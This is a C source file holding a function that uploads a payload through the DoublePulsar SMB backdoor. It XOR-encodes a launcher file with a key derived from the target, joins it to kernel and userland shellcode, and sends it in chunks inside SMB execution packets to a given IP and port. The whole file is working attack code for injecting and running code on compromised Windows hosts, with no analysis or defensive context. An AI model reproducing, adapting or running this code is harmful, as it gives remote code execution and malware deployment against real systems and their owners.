#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <limits.h>
#include <signal.h>
#include <stdarg.h>
#include <stdbool.h>
#include <stddef.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <unistd.h>
#include <ctype.h>
#include <dirent.h>
#include <poll.h>
#include <pthread.h>
#include <math.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/time.h>
#include <sys/wait.h>
#include <sys/mman.h>
#include <sys/file.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <sys/select.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <pwd.h>
#include <grp.h>
#include <utime.h>
#include <syslog.h>
#include <wchar.h>
#include "config.h"

#include <errno.h>
#include <fcntl.h>
#include <netdb.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <unistd.h>

unsigned int DoublePulsarXORKeyCalculator(const char *ip, int port);
void xor_buffer(unsigned char *data, size_t len, unsigned int key);
int smb_send(int sock, const unsigned char *data, size_t len);

int upload_payload(const char *ip, int port, const char *payload_path, int payload_type)
{
    int fd = -1;
    int sock = -1;
    unsigned char *launcher = NULL;
    unsigned char *payload = NULL;
    unsigned char *packet = NULL;
    struct stat st;
    struct addrinfo hints;
    struct addrinfo *addresses = NULL;
    struct addrinfo *address;
    char service[16];
    size_t launcher_len;
    size_t part1_len = sizeof(KERNEL_SHELLCODE_X64_PART1);
    size_t part2_len = sizeof(KERNEL_SHELLCODE_X64_PART2);
    size_t userland_len = sizeof(USERLAND_SHELLCODE_X64);
    size_t payload_len;
    size_t packet_template_len = sizeof(DP_EXEC_PKT);
    size_t offset;
    int result = -1;

    if (ip == NULL || payload_path == NULL || port < 1 || port > 65535 ||
        SMB_CHUNK_SIZE == 0 || packet_template_len > (size_t)-1 - SMB_CHUNK_SIZE)
        return -1;

    fd = open(payload_path, O_RDONLY | O_CLOEXEC);
    if (fd < 0 || fstat(fd, &st) < 0 || st.st_size <= 0)
        goto cleanup;

    launcher_len = (size_t)st.st_size;
    launcher = malloc(launcher_len);
    if (launcher == NULL)
        goto cleanup;

    offset = 0;
    while (offset < launcher_len) {
        ssize_t n = read(fd, launcher + offset, launcher_len - offset);
        if (n < 0) {
            if (errno == EINTR)
                continue;
            goto cleanup;
        }
        if (n == 0)
            goto cleanup;
        offset += (size_t)n;
    }

    xor_buffer(launcher, launcher_len,
               DoublePulsarXORKeyCalculator(ip, port));

    if (part1_len > (size_t)-1 - sizeof(uint32_t) ||
        part1_len + sizeof(uint32_t) > (size_t)-1 - part2_len ||
        part1_len + sizeof(uint32_t) + part2_len > (size_t)-1 - userland_len ||
        part1_len + sizeof(uint32_t) + part2_len + userland_len >
            (size_t)-1 - launcher_len)
        goto cleanup;

    payload_len = part1_len + sizeof(uint32_t) + part2_len +
                  userland_len + launcher_len;
    payload = malloc(payload_len);
    if (payload == NULL)
        goto cleanup;

    offset = 0;
    memcpy(payload + offset, KERNEL_SHELLCODE_X64_PART1, part1_len);
    offset += part1_len;

    {
        uint32_t process_hash = (uint32_t)payload_type;
        payload[offset++] = (unsigned char)(process_hash & 0xffU);
        payload[offset++] = (unsigned char)((process_hash >> 8) & 0xffU);
        payload[offset++] = (unsigned char)((process_hash >> 16) & 0xffU);
        payload[offset++] = (unsigned char)((process_hash >> 24) & 0xffU);
    }

    memcpy(payload + offset, KERNEL_SHELLCODE_X64_PART2, part2_len);
    offset += part2_len;
    memcpy(payload + offset, USERLAND_SHELLCODE_X64, userland_len);
    offset += userland_len;
    memcpy(payload + offset, launcher, launcher_len);

    memset(&hints, 0, sizeof(hints));
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_family = AF_UNSPEC;
    (void)snprintf(service, sizeof(service), "%d", port);
    if (getaddrinfo(ip, service, &hints, &addresses) != 0)
        goto cleanup;

    for (address = addresses; address != NULL; address = address->ai_next) {
        sock = socket(address->ai_family, address->ai_socktype,
                      address->ai_protocol);
        if (sock < 0)
            continue;
        if (connect(sock, address->ai_addr, address->ai_addrlen) == 0)
            break;
        close(sock);
        sock = -1;
    }
    if (sock < 0)
        goto cleanup;

    packet = malloc(packet_template_len + SMB_CHUNK_SIZE);
    if (packet == NULL)
        goto cleanup;

    for (offset = 0; offset < payload_len;) {
        size_t chunk_len = payload_len - offset;
        if (chunk_len > SMB_CHUNK_SIZE)
            chunk_len = SMB_CHUNK_SIZE;

        memcpy(packet, DP_EXEC_PKT, packet_template_len);
        memcpy(packet + packet_template_len, payload + offset, chunk_len);
        if (smb_send(sock, packet, packet_template_len + chunk_len) != 0)
            goto cleanup;

        offset += chunk_len;
    }

    result = 0;

cleanup:
    if (sock >= 0)
        close(sock);
    if (addresses != NULL)
        freeaddrinfo(addresses);
    if (fd >= 0)
        close(fd);
    free(packet);
    free(payload);
    free(launcher);
    return result;
}